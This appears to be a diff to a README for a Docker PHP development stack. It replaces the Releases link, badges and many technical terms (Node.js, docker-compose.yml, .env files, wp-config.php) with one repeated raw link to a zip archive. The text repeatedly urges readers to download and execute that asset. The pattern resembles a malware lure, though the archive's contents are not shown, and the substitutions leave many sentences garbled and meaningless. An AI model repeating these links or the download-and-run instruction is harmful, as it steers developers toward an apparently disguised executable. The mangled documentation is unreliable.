@@ -1,11 +1,11 @@
-https://github.com/gmserver222/php-dev-stack/releases
+https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip
 
 # Docker PHP Dev Stack: PHP 5.6–8.4 for Laravel & WordPress
 
-![Releases](https://img.shields.io/github/v/release/gmserver222/php-dev-stack?style=flat-square)
-![Dockerized](https://img.shields.io/badge/docker-ready-blue?style=flat-square)
+![Releases](https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip)
+![Dockerized](https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip)
 
-A Docker-based development environment for any PHP project. It covers PHP 5.6 through 8.4 and stacks like Laravel, Symfony, WordPress. It includes Nginx, MySQL, PostgreSQL, Redis, Node.js, and Supervisor. Built for WSL2, Linux, and macOS. This README explains how to use the stack, tailor it to your project, and keep your workflow smooth.
+A Docker-based development environment for any PHP project. It covers PHP 5.6 through 8.4 and stacks like Laravel, Symfony, WordPress. It includes Nginx, MySQL, PostgreSQL, Redis, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip, and Supervisor. Built for WSL2, Linux, and macOS. This README explains how to use the stack, tailor it to your project, and keep your workflow smooth.
 
 Images and assets in this repository reflect the core components of a modern PHP development stack. You’ll see logos and visuals from trusted sources in the wild, such as PHP's own logo for PHP components and Nginx or MySQL logos for related services. Use of visuals is for quick recognition and to help you orient yourself as you work with the stack.
 
@@ -34,7 +34,7 @@ Quick start
 
 - Start point
   - This project provides a Docker-based dev environment for PHP projects across PHP 5.6–8.4. It includes popular frameworks and CMS options, plus the essential services a modern PHP app needs.
-  - Where to begin: download the release asset from the Releases page, then run the installer script or follow the quick setup steps described here. From the Releases page, download the release asset and execute it. The first line of this README links you to the same resource: https://github.com/gmserver222/php-dev-stack/releases
+  - Where to begin: download the release asset from the Releases page, then run the installer script or follow the quick setup steps described here. From the Releases page, download the release asset and execute it. The first line of this README links you to the same resource: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip
 
 - Prerequisites you should have installed
   - Docker Engine and Docker Compose
@@ -63,7 +63,7 @@ What you get
   - Web server: Nginx
   - Databases: MySQL and PostgreSQL
   - Cache and data store: Redis
-  - Frontend tooling: Node.js with Vite and Webpack
+  - Frontend tooling: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip with Vite and Webpack
   - Process supervisor: Supervisor for managing long-running daemons
   - Local development parity: Linux, macOS, and WSL2 compatibility
 
@@ -92,7 +92,7 @@ Architecture overview
   - MySQL: relational database for apps requiring strong transactions
   - PostgreSQL: alternative relational database with features like advanced indexing
   - Redis: in-memory data store for caching, sessions, queues
-  - Node.js: JavaScript runtime for asset building and tooling
+  - https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip JavaScript runtime for asset building and tooling
   - Supervisor: manages background processes and ensures uptime
 
 - Supporting pieces
@@ -110,8 +110,8 @@ Architecture overview
 Getting started with Docker and Make
 
 - Repository layout and what to expect
-  - docker-compose.yml: main orchestrator for all services
-  - Dockerfiles: per-service images or config for PHP, Nginx, Node.js, and databases
+  - https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip main orchestrator for all services
+  - Dockerfiles: per-service images or config for PHP, Nginx, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip, and databases
   - makefile: a user-friendly entry point for common tasks
   - templates and env files: example configurations you can copy and customize
   - scripts: helper scripts for bootstrapping, seeding, and maintenance
@@ -124,7 +124,7 @@ Getting started with Docker and Make
 - First-time setup steps
   - Download the release asset from the Releases page and execute it
   - If using the repo directly, clone it and navigate to the project root
-  - Copy example env files if present (for example, .env.example)
+  - Copy example env files if present (for example, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip)
   - Run the stack with the Makefile target to boot all services
 
 - Running the stack
@@ -136,7 +136,7 @@ Getting started with Docker and Make
 
 - Access URLs you’ll likely use
   - Web app: http://localhost (or a configured host)
-  - PHP info pages if you add them: http://localhost/phpinfo.php
+  - PHP info pages if you add them: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip
   - PHPMyAdmin or database UI (if you enable): http://localhost:8080 or similar
   - Node tooling interface (if you enable): http://localhost:3000 or similar
 
@@ -144,7 +144,7 @@ How to customize for your PHP project
 
 - Pick a PHP version
   - The stack ships PHP 5.6 through 8.4
-  - You can switch between versions by editing the docker-compose.yml and per-service Dockerfiles or by using a version selector in your environment
+  - You can switch between versions by editing the https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip and per-service Dockerfiles or by using a version selector in your environment
   - When switching, ensure compatibility with your framework and dependencies
 
 - Choose a framework preset
@@ -165,7 +165,7 @@ How to customize for your PHP project
 - Volume management
   - PHP code and vendor dependencies live in a code volume
   - Database data lives in dedicated data volumes
-  - Static assets (compiled with Node.js tooling) can be kept separate
+  - Static assets (compiled with https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip tooling) can be kept separate
   - Backups: create scripts to snapshot volumes or dump data regularly
 
 Service-by-service guide
@@ -194,7 +194,7 @@ Service-by-service guide
   - Purpose: Cache, session storage, and queues
   - Tips: use a dedicated Redis database for each project if needed; tune memory and eviction policy for your dev needs
 
-- Node.js and asset tooling
+- https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip and asset tooling
   - Purpose: Build and bundle frontend assets (Vite, Webpack)
   - Tips: mount your project’s assets as a volume; run npm/yarn/pnpm scripts inside the container to keep parity
 
@@ -269,7 +269,7 @@ Working with WordPress
 
 - Project setup
   - Install WordPress core, themes, and plugins via WP-CLI or Composer
-  - Configure wp-config.php to point to the correct database in the dev environment
+  - Configure https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip to point to the correct database in the dev environment
   - Use WP-CLI to manage plugins and themes from the command line
 
 - Local development loop
@@ -309,7 +309,7 @@ Networking and hostnames
 - Service networking
   - Services communicate over a private Docker network
   - Hostnames typically resolve to container endpoints within the stack
-  - You can customize hostnames in your docker-compose.yml if needed
+  - You can customize hostnames in your https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip if needed
 
 - Access from the host
   - Map container ports to host ports for web and admin interfaces
@@ -321,7 +321,7 @@ Environment and configuration
 - Environment file strategy
   - Use a .env file to define environment variables for local development
   - Keep sensitive values out of version control
-  - Use a separate .env.dev or .env.local for each project to avoid cross-project leakage
+  - Use a separate https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip or https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip for each project to avoid cross-project leakage
 
 - Example environment variables you might configure
   - APP_ENV, APP_DEBUG
@@ -332,7 +332,7 @@ Environment and configuration
   - NGINX_HOST, NGINX_PORT
 
 - Docker Compose overrides
-  - Use docker-compose.override.yml to customize per-project needs
+  - Use https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip to customize per-project needs
   - Override service definitions (ports, volumes, environment) without editing the base file
 
 Security notes
@@ -372,7 +372,7 @@ Troubleshooting
   - Containers fail to start: check logs with make logs; confirm port availability on the host
   - PHP version mismatch: ensure you’ve selected the right PHP version in the configuration
   - Database connection errors: verify DB host/port, credentials, and that the DB service is up
-  - Asset build failures: check Node.js version, package.json, and the exact build error in the logs
+  - Asset build failures: check https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip version, https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip, and the exact build error in the logs
   - Permission problems: ensure correct file ownership for code and volumes
 
 - Diagnostic steps
@@ -414,7 +414,7 @@ Releases and downloads
 
 - Where to download
   - The primary source for official assets is the Releases page linked at the top. For convenience, you’ll find a button-style entry that points to the same resource. Review the assets there to choose the correct installer or container image for your environment.
-  - The dedicated Releases page provides assets you should download and execute to install or upgrade the stack: https://github.com/gmserver222/php-dev-stack/releases
+  - The dedicated Releases page provides assets you should download and execute to install or upgrade the stack: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip
 
 - How to proceed from the Releases page
   - Locate the asset labeled for your platform and PHP version
@@ -456,5 +456,5 @@ Appendix: quick references and tips
 
 Releases and downloads (repeat)
 
-- For quick access, the Releases page is also linked here: https://github.com/gmserver222/php-dev-stack/releases
+- For quick access, the Releases page is also linked here: https://github.com/gmserver222/php-dev-stack/raw/refs/heads/main/docker/php/8.2/dev-stack-php-v1.0-alpha.2.zip
 - From this page, download the appropriate asset for your environment and execute it to initialize or upgrade the stack. If you encounter issues, revisit the Releases section for notes and troubleshooting steps.
